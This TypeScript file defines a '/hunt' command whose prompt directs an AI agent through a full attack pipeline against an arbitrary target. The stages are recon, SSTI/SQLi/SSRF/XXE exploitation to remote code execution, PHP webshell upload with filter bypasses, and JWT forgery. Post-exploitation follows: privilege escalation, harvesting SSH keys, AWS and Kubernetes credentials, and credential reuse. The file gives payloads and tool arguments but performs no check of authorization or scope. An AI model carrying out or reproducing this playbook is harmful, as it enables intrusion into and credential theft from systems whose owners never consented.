import type { ContentBlockParam } from '@anthropic-ai/sdk/resources/index.mjs'
import type { Command } from '../../commands.js'
import { homedir } from 'os'
import { join } from 'path'

const hunt = {
  type: 'prompt',
  name: 'hunt',
  description: 'Full attack pipeline: recon → critical exploitation (SSTI/SSRF/SQLi→RCE) → chain findings',
  argumentHint: '<target> [--mode red|wapt|bounty|audit]',
  source: 'builtin',
  progressMessage: 'Running hunt pipeline',
  async getPromptForCommand(args: string): Promise<ContentBlockParam[]> {
    const parts = args.trim().split(/\s+/)
    const target = parts[0] ?? ''
    if (!target) {
      return [{ type: 'text', text: 'Usage: /hunt <target> [--mode red|wapt|bounty|audit]\nExample: /hunt example.com --mode bounty' }]
    }
    const modeFlag = parts.findIndex(p => p === '--mode')
    const mode = modeFlag >= 0 ? (parts[modeFlag + 1] ?? 'bounty') : 'bounty'
    const outputDir = join(homedir(), 'Targets', target)
    return [{ type: 'text', text: buildHuntPrompt(target, mode, outputDir) }]
  },
  contentLength: 0,
} satisfies Command

function buildHuntPrompt(target: string, mode: string, outputDir: string): string {
  const modeInstructions: Record<string, string> = {
    red: 'Red Team: full kill-chain — pursue RCE, lateral movement, AD/cloud pivoting, persistence if in scope',
    wapt: 'WAPT: application-layer focus, document all findings, pursue RCE via injection before reporting lower-impact',
    bounty: 'Bug Bounty: confirmed exploitability required — chain bugs to P1 (RCE/auth-bypass/data-exfil), skip standalone info findings',
    audit: 'Security Audit: enumerate all attack surface systematically, document critical findings fully before moving to medium/low',
  }
  const modeCtx = modeInstructions[mode] ?? modeInstructions['bounty']

  return `Hunt for vulnerabilities on **${target}**.
**Mode**: ${mode.toUpperCase()} — ${modeCtx}
**Output**: \`${outputDir}/findings/\` — create directory with Bash if needed.

## PRIORITY RULE — Always Chase the Highest Impact Path
RCE (SSTI/cmdi/deserialization) > Shell via SQLi/file-upload > Cloud creds via SSRF > Data exfil via SQLi/XXE > Auth bypass > IDOR write > IDOR read > Stored XSS (only if chains to admin takeover) > Everything else.

**CRITICAL: Do NOT loop on XSS.** Confirm reflected XSS once per parameter, then immediately test the SAME parameter for SSTI (${7*7}, {{7*7}}, <%=7*7%>), SQLi, and command injection. XSS is Tier-3; RCE is Tier-1.

---

## Phase 1 — Recon
1. ReconTool crt_lookup domain="${target}" → subdomains
2. NmapTool service scan on each subdomain + root target (ports 80,443,8080,8443,8000,3000,5000)
3. FuzzTool wordlist=common and wordlist=api on each live web host
4. Write: subdomains.txt, live-hosts.txt, endpoints.txt

## Phase 2 — Attack Surface — Classify and Prioritize
Map each endpoint to its highest-value attack class:
- /search, /template, /render, ?q=, ?name= → **SSTI** (highest priority — leads to RCE)
- ?url=, /proxy, /fetch, /webhook, /callback → **SSRF** (leads to cloud creds)
- /login, /auth, /api/*, ?id=, ?user= → **SQLi** (leads to OS shell + data dump)
- /upload, /import, /file, /avatar → **file-upload** (leads to webshell)
- /xml, /soap, /import?format=xml → **XXE** (leads to LFI + SSRF pivot)
- JWT in Authorization header → **JWT attacks** (alg:none, crack, confusion)
- /reset, /forgot, ?token=, ?key= → **auth-bypass**
- ?id=, /users/, /orders/, /invoices/ → **IDOR**

Write prioritized list to attack-surface.txt.

## Phase 3 — Active Exploitation (CRITICAL PATHS FIRST)

### 3a. SSTI → RCE (HIGHEST PRIORITY — do this first)
For every template/search/render endpoint:
0. Optional pre-scan: FuzzTool url="<endpoint>?param=FUZZ" wordlist=ssti → find which parameters evaluate template expressions
1. SSTITool action=detect → if math payload evaluates → confirmed
2. SSTITool action=identify → get engine
3. SSTITool action=exploit → immediately → OS command execution
4. After RCE: run PrivEscTool action=all + CredHarvestTool action=deep path=/var/www
5. ChainTool bug_class=ssti → escalation vectors

**3-strike rule**: if 3 SSTI probes fail, pivot to SSRF.

### 3b. SSRF → Cloud Credentials
For every URL-processing endpoint:
1. SSRFTool action=scan → auto-probe all cloud metadata + internal services
2. If AWS hit: retrieve /latest/meta-data/iam/security-credentials/<role> → keys
3. If GCP hit: retrieve token from metadata.google.internal (Metadata-Flavor: Google header)
4. If Redis/ES hit: enumerate and extract data
5. ChainTool bug_class=ssrf → escalation vectors

### 3c. SQLi → OS Shell → Webshell
For all authentication, search, and ID-bearing endpoints:
1. SQLiTool action=detect_only → if vulnerable:
2. SQLiTool action=dump_dbs → credentials
3. SQLiTool extra_args="--os-shell --batch" → OS command execution
4. If OS shell: PrivEscTool action=all
5. ChainTool bug_class=sqli → escalation vectors

**3-strike rule**: if 3 SQLi probes fail, pivot to file-upload testing.

### 3d. File Upload → Webshell
For every upload endpoint:
1. Upload PHP webshell with Content-Type: image/jpeg
2. If blocked: try .php5, .phtml, .phar, .php.jpg, .PhP, add JPEG magic bytes
3. Locate upload path from response / FuzzTool on /uploads/, /files/, /media/
4. Confirm RCE: GET /uploads/shell.php?cmd=id
5. ChainTool bug_class=file-upload → escalation vectors

### 3e. XXE → LFI → Pivot
For XML-accepting endpoints:
1. XXETool action=detect → if confirmed:
2. XXETool action=file_read file_path=/etc/passwd → /proc/net/tcp → app config files → SSH keys
3. XXETool action=ssrf → probe internal services
4. ChainTool bug_class=lfi → escalation vectors

### 3f. JWT Attacks
For every JWT-authenticated endpoint:
1. JWTTool action=decode → check algorithm, kid, exp
2. JWTTool action=alg_none → test all 8 case/dot variants
3. JWTTool action=crack wordlist=rockyou → if cracked → forge admin token
4. If RS256: obtain public key from /.well-known/jwks.json → JWTTool action=alg_confusion
5. ChainTool bug_class=jwt-weak-secret → privilege escalation

### 3g. IDOR (lower priority — test after RCE paths)
For ID-bearing endpoints:
1. Test horizontal: swap your ID for adjacent IDs (N-1, N+1, N-100)
2. Test vertical: use lower-privilege token on higher-privilege endpoints
3. Test write: PUT/PATCH/DELETE with another user's ID
4. ChainTool bug_class=idor-read → escalation vectors (write/financial/bulk-exfil)

### 3h. Auth Bypass (test password reset flows)
1. Try expired/reused tokens, test token entropy, test user enumeration via timing
2. SQLi in username field
3. ChainTool bug_class=sqli → if SQLi in auth

## Phase 4 — Post-Exploitation (after gaining any shell or cloud creds)
After RCE or cloud credential theft, escalate:
1. PrivEscTool action=all — enumerate local priv-esc vectors (polkit/docker/sudo/SUID)
2. CredHarvestTool path=/var/www action=deep — app source code (DB passwords, API keys)
3. CredHarvestTool path=/home action=deep — user home dirs (.ssh/id_rsa, .aws/credentials, .bash_history)
4. CredHarvestTool path=/root action=deep — root-level credentials if elevated
5. From DB credentials: test reuse on other services (SSH, admin panels, other DBs)
6. From AWS creds: enumerate via NucleiTool profile=aws + probe S3/EC2/Secrets Manager
7. From k8s SA token: read /var/run/secrets/kubernetes.io/serviceaccount/token → API access

## Phase 5 — Chaining Low → High
For each confirmed low/medium finding, call ChainTool bug_class=<class> to identify how it escalates.
Key chains:
- open-redirect + OAuth → token theft → account takeover
- stored-xss + admin context → CSRF → account takeover
- LFI + writable log → log poisoning → RCE
- SSRF + Redis → gopher protocol → Redis RCE

## Checkpoints (every 20 minutes of active testing)
Stop and summarize: what was tested, what was confirmed, what's next.

## Confirmation Requirements
Before reporting any finding:
- Unique marker ≥8 chars injected AND absent from baseline
- For timing attacks: ≥5 interleaved samples
- For SSRF: actual outbound connection or metadata response confirmed
- For RCE: id/whoami output or DNS callback with hostname
- For SQLi: data extracted or clear boolean behavioral difference

## Output Format
For each confirmed finding, BOTH write the file AND record in EngagementTool:

1. Write \`${outputDir}/findings/finding-NN-<class>-<endpoint>.md\`:
\`\`\`
## <VulnClass> in <Endpoint>
**Severity**: P1/P2/P3/P4
**Endpoint**: <method> <url>
**Parameter**: <param>
**Payload**: <exact payload>
**Evidence**: <proof of exploitability>
**Impact**: <what attacker gains>
**Chain**: <ChainTool output for escalation>
\`\`\`

2. Record formally: EngagementTool action=add_finding target="${target}" finding={title:"<class>-<endpoint-slug>", severity:"P1"|"P2"|"P3"|"P4", endpoint:"<METHOD> <url>", payload:"<payload>", evidence:"<evidence>", impact:"<impact>", vuln_class:"<class>"}`
}

export default hunt
